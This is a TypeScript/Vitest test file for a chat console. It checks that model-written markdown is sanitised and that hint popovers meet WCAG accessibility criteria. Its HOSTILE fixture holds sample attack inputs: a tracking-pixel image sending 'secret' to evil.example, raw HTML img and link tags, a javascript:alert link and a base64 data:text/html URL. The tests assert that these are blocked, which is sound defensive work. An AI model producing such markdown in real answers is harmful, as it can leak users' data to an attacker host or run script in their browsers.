// @vitest-environment jsdom
/**
 * What: hardening tests for the message furniture: hostile model markdown (images, raw HTML,
 *   non-http links), hint popovers (Escape, hoverable, open only on demand, kept in the viewport)
 *   and focus not hidden under the sticky input bar.
 * Use when: `pnpm test`.
 * Inputs: hostile answer strings; the S3 and S5 fixtures replayed into a fresh turn store.
 * Output: vitest results.
 * Side effects: none (no network).
 * Role: CS-E-04.S5.T3 review PR #29 fixes I1 to I4 (WCAG 1.4.13, 1.4.10, 2.4.11).
 */
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { SseEvent } from "@contracts/contracts";
import { loadFixture } from "@/test-support/fixtures";
import { createTurnStore } from "@/lib/turns/store";

import { ConsoleShell } from "./console-shell";
import { AnswerMarkdown } from "./furniture";

vi.mock("next/navigation", () => ({ useRouter: () => ({ push: vi.fn(), replace: vi.fn() }) }));

const s3 = loadFixture("s3_decline.jsonl");
const s5 = loadFixture("s5_failures.jsonl");

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

/**
 * What: a store with the fixture events applied (no user bubbles).
 * Use when: rendering the console with replayed data.
 * Inputs: events.
 * Output: a fresh StoreApi.
 * Side effects: none.
 * Role: test helper.
 */
function replayed(events: readonly SseEvent[]) {
  const store = createTurnStore();
  for (const e of events) store.getState().apply(e);
  return store;
}

const HOSTILE = [
  "Intro ![pixel](https://evil.example/track.png?d=secret) and ![rel](/x.png) end.",
  '<img src="https://evil.example/raw.png"> <a href="https://evil.example/raw">raw link</a>',
  "[js](javascript:alert(1)) [data](data:text/html;base64,PHNjcmlwdD4=)",
  "[mail](mailto:a@b.c) [phone](tel:+123) [local](/console/x) [proto](//evil.example/x)",
  "[ok](https://quillstack.example/help)",
].join("\n\n");

describe.each([false, true])("hostile answer markdown (streaming %s)", (streaming) => {
  it("loads no image, from markdown or raw HTML", () => {
    const { container } = render(<AnswerMarkdown text={HOSTILE} streaming={streaming} />);
    expect(container.querySelectorAll("img, picture, source, video, audio, iframe, object, embed")).toHaveLength(0);
    expect(container.innerHTML).not.toContain("evil.example/track.png");
    expect(container.innerHTML).not.toContain("evil.example/raw.png");
  });

  it("keeps only http(s) links live; everything else is plain text", () => {
    const { container } = render(<AnswerMarkdown text={HOSTILE} streaming={streaming} />);
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs.every((h) => h !== null && /^https?:\/\//.test(h))).toBe(true);
    expect(hrefs).toContain("https://quillstack.example/help");
    for (const word of ["mail", "phone", "local", "proto", "js", "data"]) {
      expect(screen.queryByRole("link", { name: word })).toBeNull();
    }
    expect(screen.getByText("mail")).toBeTruthy();
    expect(screen.getByText("local")).toBeTruthy();
    for (const a of container.querySelectorAll("a")) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toContain("noopener");
    }
  });
});

describe("hint popovers (WCAG 1.4.13, 1.4.10)", () => {
  /**
   * What: the hint element a trigger points at.
   * Use when: checking open state.
   * Inputs: the trigger.
   * Output: the tooltip element.
   * Side effects: none.
   * Role: test helper.
   */
  const hintOf = (trigger: HTMLElement) => document.getElementById(trigger.getAttribute("aria-describedby") as string) as HTMLElement;

  it("is closed and out of layout until hovered or focused", () => {
    render(<ConsoleShell sessionId="s" store={replayed(s5)} />);
    const chip = screen.getByRole("button", { name: /Ticket ending 8213/ });
    const tip = hintOf(chip);
    expect(tip.dataset.open).toBe("false");
    expect(tip.className).toMatch(/(^|\s)hidden(\s|$)/);
    fireEvent.focus(chip);
    expect(tip.dataset.open).toBe("true");
    expect(tip.className).not.toMatch(/(^|\s)hidden(\s|$)/);
  });

  it("closes on Escape when opened by focus, and by hover", () => {
    render(<ConsoleShell sessionId="s" store={replayed(s5)} />);
    const badge = screen.getByRole("button", { name: "Fallback model" });
    const tip = hintOf(badge);
    fireEvent.focus(badge);
    expect(tip.dataset.open).toBe("true");
    fireEvent.keyDown(badge, { key: "Escape" });
    expect(tip.dataset.open).toBe("false");
    fireEvent.blur(badge);
    fireEvent.mouseEnter(badge.parentElement as HTMLElement);
    expect(tip.dataset.open).toBe("true");
    fireEvent.keyDown(document, { key: "Escape" });
    expect(tip.dataset.open).toBe("false");
  });

  it("stays open while the pointer moves onto the hint", () => {
    render(<ConsoleShell sessionId="s" store={replayed(s3)} />);
    const link = screen.getByRole("link", { name: /Billing permissions/ });
    const tip = hintOf(link);
    const wrap = link.parentElement as HTMLElement;
    fireEvent.mouseEnter(wrap);
    expect(tip.dataset.open).toBe("true");
    expect(tip.className).not.toContain("pointer-events-none");
    expect(wrap.contains(tip)).toBe(true);
    fireEvent.mouseLeave(wrap);
    expect(tip.dataset.open).toBe("false");
  });

  it("shifts left so an open hint ends inside a 320 px viewport", () => {
    vi.spyOn(window, "innerWidth", "get").mockReturnValue(320);
    vi.spyOn(HTMLElement.prototype, "getBoundingClientRect").mockImplementation(function (this: HTMLElement) {
      const isHint = this.getAttribute("role") === "tooltip";
      return { left: isHint ? 180 : 180, right: isHint ? 337 : 260, top: 0, bottom: 0, width: 0, height: 0, x: 0, y: 0, toJSON: () => ({}) } as DOMRect;
    });
    render(<ConsoleShell sessionId="s" store={replayed(s3)} />);
    const link = screen.getByRole("link", { name: /Billing permissions/ });
    act(() => {
      fireEvent.focus(link);
    });
    const tip = hintOf(link);
    // 337 - (320 - 16) = 33 px to the left
    expect(tip.style.transform).toBe("translateX(-33px)");
  });
});

describe("focus not obscured (WCAG 2.4.11)", () => {
  it("chips keep clear of the sticky input bar and header when scrolled into view", () => {
    render(<ConsoleShell sessionId="s" store={replayed(s5)} />);
    const chips = [
      screen.getByRole("button", { name: /Ticket ending 8213/ }),
      screen.getByRole("button", { name: "Fallback model" }),
    ];
    for (const c of chips) {
      expect(c.className).toContain("scroll-mb-[var(--input-bar-clearance)]");
      expect(c.className).toContain("scroll-mt-[var(--header-clearance)]");
    }
  });
});
